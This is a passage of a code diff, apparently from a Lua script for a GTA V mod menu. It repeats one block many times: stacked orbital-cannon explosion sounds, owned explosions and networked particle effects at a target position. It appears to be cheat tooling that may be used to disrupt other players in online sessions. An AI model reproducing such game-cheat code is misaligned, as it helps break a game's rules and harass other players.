+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            CAM.SHAKE_CAM(cam, "GAMEPLAY_EXPLOSION_SHAKE", 1.5)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            util.yield(60)
+            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
+            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
+            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
+                effect.name, 
+                pos.x,
+                pos.y,
+                pos.z, 
+                0.0, 
+                0.0, 
+                0.0,
+                1.0, 
+                false, false, false, true
+            )
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
+            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
